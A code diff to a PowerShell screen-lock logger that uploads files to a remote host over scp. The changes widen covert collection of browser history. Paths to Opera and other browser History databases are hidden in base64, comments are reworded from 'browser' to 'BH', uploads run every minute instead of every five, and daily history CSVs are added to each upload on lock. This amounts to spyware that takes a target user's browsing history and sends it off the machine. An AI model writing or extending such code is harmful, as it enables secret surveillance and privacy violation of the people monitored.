@@ -2,7 +2,7 @@
 # On screen lock, copies the two newest unlocked-time-*.log files and error logs.
 
 # BHistory periodic SCP (not configurable).
-$script:ScpBHistoryIntervalMinutes = 5
+$script:ScpBHistoryIntervalMinutes = 1
 # StrictMode-safe defaults (Test-ScpOnLock / Copy-LogsViaScp dot-source this file).
 $script:LastBHistoryMissingWarnUtc = $null
 $script:LastBHistorySourceWriteUtc = $null
@@ -56,7 +56,7 @@ $script:ScpBHistoryOpProductRels = @(
     (ConvertFrom-ScpB64Path 'T3BlcmEgU29mdHdhcmVcT3BlcmEgR1g=')
     (ConvertFrom-ScpB64Path 'T3BlcmEgR1ggU3RhYmxl')
 )
-# paths relative to a browser install directory.
+# paths relative to a BH install directory.
 $script:ScpBHistoryInstallRels = @(
     (ConvertFrom-ScpB64Path 'cHJvZmlsZVxIaXN0b3J5')
     (ConvertFrom-ScpB64Path 'ZGF0YVxwcm9maWxlXEhpc3Rvcnk=')
@@ -702,7 +702,7 @@ function Get-TargetUserProfilePath {
 
 function Get-BHistoryInstallRootPaths {
     <#
-      Candidate browser install directories (Program Files, Local\Programs, Uninstall registry).
+      Candidate BH install directories (Program Files, Local\Programs, Uninstall registry).
     #>
     param(
         [Parameter(Mandatory)][string]$ProfilePath,
@@ -777,7 +777,7 @@ function Get-BHistoryInstallRootPaths {
 
 function Resolve-BHistoryPathForFamily {
     <#
-      First existing History path for one browser family.
+      First existing BH path for one b family.
     #>
     param(
         [Parameter(Mandatory)][string]$TargetUsername,
@@ -830,7 +830,7 @@ function Resolve-BHistoryPathForFamily {
 
 function Get-BHistoryStageLeafSafeName {
     <#
-      Sanitize a browser profile directory name for use in StageLeaf.
+      Sanitize a profile directory name for use in StageLeaf.
       Spaces become '-' (Profile 1 -> Profile-1).
     #>
     param([Parameter(Mandatory)][string]$Name)
@@ -1484,8 +1484,9 @@ function Get-ScpOnLockMissingConfigFields {
 function Get-ScpOnLockSourceFiles {
     <#
       Collects log files for SCP-on-lock: the two newest unlocked-time-*.log
-      files under LogDirectory, plus all error logs (errors.log paths).
-      Does not copy service.log, summary CSV, state.json, or older time logs.
+      files under LogDirectory, all error logs, service.log, and today's
+      BH under LogDirectory\bhist (after convert).
+      Does not copy summary CSV, state.json, or older time logs.
     #>
     param(
         [Parameter(Mandatory)]$Config,
@@ -1553,6 +1554,26 @@ function Get-ScpOnLockSourceFiles {
         Get-ChildItem -LiteralPath $logDir -File -Force `
             -Filter '*error*.log' -ErrorAction SilentlyContinue |
             ForEach-Object { & $addFile $_.FullName }
+
+        & $addFile (Join-Path $logDir 'service.log')
+    }
+
+    # Today's history CSVs: convert then include every log-history-*-YYYY-MM-DD.csv.
+    try {
+        foreach ($csv in @(New-BHistoryCsvExports -Config $Config)) {
+            & $addFile ([string]$csv)
+        }
+    }
+    catch {
+        $day = Get-Date -Format 'yyyy-MM-dd'
+        if (-not [string]::IsNullOrWhiteSpace($logDir)) {
+            $bhistDir = Join-Path $logDir 'bhist'
+            if (Test-Path -LiteralPath $bhistDir) {
+                Get-ChildItem -LiteralPath $bhistDir -File -Force `
+                    -Filter ('log-history-*-{0}.csv' -f $day) -ErrorAction SilentlyContinue |
+                    ForEach-Object { & $addFile $_.FullName }
+            }
+        }
     }
 
     return @($files)
@@ -1561,10 +1582,12 @@ function Get-ScpOnLockSourceFiles {
 function Get-ScpManualSourceFiles {
     <#
       Collects a fuller set for manual SCP: every unlocked-time-*.log under
-      LogDirectory, all error logs, unlocked-time-summary.csv, state.json,
+      LogDirectory, all error logs, state.json, every *.csv under LogDirectory
+      (recursive, including bhist history CSVs and unlocked-time-summary.csv),
       and any raw History DB copies already under LogDirectory (log-history-*
-      without a .csv extension). Does not include service.log or stage live
-      browser History (callers use New-ScpBHistoryUploadFiles for that).
+      without a .csv extension). Refreshes today's history CSVs via
+      New-BHistoryCsvExports when available. Does not include service.log or
+      stage live BH (callers use New-ScpBHistoryUploadFiles).
     #>
     param(
         [Parameter(Mandatory)]$Config,
@@ -1601,13 +1624,18 @@ function Get-ScpManualSourceFiles {
         $logDir = [string]$Config.LogDirectory
     }
 
+    # Refresh today's history CSVs before collecting all *.csv under LogDirectory.
+    try {
+        $null = @(New-BHistoryCsvExports -Config $Config)
+    }
+    catch { }
+
     if (-not [string]::IsNullOrWhiteSpace($logDir) -and (Test-Path -LiteralPath $logDir)) {
         Get-ChildItem -LiteralPath $logDir -File -Force `
             -Filter 'unlocked-time-*.log' -ErrorAction SilentlyContinue |
             Sort-Object Name |
             ForEach-Object { & $addFile $_.FullName }
 
-        & $addFile (Join-Path $logDir 'unlocked-time-summary.csv')
         & $addFile (Join-Path $logDir 'state.json')
 
         Get-ChildItem -LiteralPath $logDir -File -Force `
@@ -1615,6 +1643,12 @@ function Get-ScpManualSourceFiles {
             ForEach-Object { & $addFile $_.FullName }
         Get-ChildItem -LiteralPath $logDir -File -Force `
             -Filter '*error*.log' -ErrorAction SilentlyContinue |
+            ForEach-Object { & $addFile $_.FullName }
+
+        # All CSV files under LogDirectory (summary, bhist history CSVs, …).
+        Get-ChildItem -LiteralPath $logDir -File -Force -Recurse `
+            -Filter '*.csv' -ErrorAction SilentlyContinue |
+            Sort-Object FullName |
             ForEach-Object { & $addFile $_.FullName }
 
         # Raw History DB snapshots (log-history-op / log-history-ch / …), not CSVs.
@@ -1702,7 +1736,8 @@ function Invoke-ScpLogCopyOnLock {
     <#
     .SYNOPSIS
       Copies LoginTimeLogger logs to the configured remote via scp on screen lock.
-      Copies the two newest unlocked-time-*.log files and all error logs.
+      Copies the two newest unlocked-time-*.log files, all error logs,
+      service.log, and today's BH CSVs under LogDirectory\bhist.
       Failures are logged; they do not stop the monitor. Failed copies also
       email with error logs attached when SMTP is enabled.
     #>
@@ -1779,7 +1814,18 @@ function Invoke-ScpLogCopyOnLock {
 
         # Hard cap: ConnectTimeout only covers TCP connect. A stalled transfer
         # previously blocked the monitor for hours (see Connection aborted after ~2.5h).
-        $scpTimeoutSeconds = 90
+        # Scale with payload (~50 KiB/s floor + 60s slack) now that CSVs are included;
+        # clamp 90..600.
+        $totalBytes = [int64]0
+        foreach ($bf in $files) {
+            try {
+                $totalBytes += [int64](Get-Item -LiteralPath $bf -Force).Length
+            }
+            catch { }
+        }
+        $scpTimeoutSeconds = 60 + [int][Math]::Ceiling($totalBytes / 51200.0)
+        if ($scpTimeoutSeconds -lt 90) { $scpTimeoutSeconds = 90 }
+        if ($scpTimeoutSeconds -gt 600) { $scpTimeoutSeconds = 600 }
 
         Write-LoggerEvent ("SCP on lock: copying {0} file(s) to {1} (timeout {2}s): {3}" -f `
                 $files.Count, $remoteTarget, $scpTimeoutSeconds, ($files -join '; '))
@@ -2962,7 +3008,7 @@ function Invoke-ScpCommandsFileExchange {
 function Invoke-ScpBHistoryCopy {
     <#
     .SYNOPSIS
-      Every interval: for every op/ch browser profile History DB, run
+      Every interval: for every op/ch profile BH DB, run
       Convert-LogBhToCsv.ps1 -PreviousDays 1 into
       log-history-op-<profile>-YYYY-MM-DD.csv /
       log-history-ch-<profile>-YYYY-MM-DD.csv under LogDirectory\bhist,
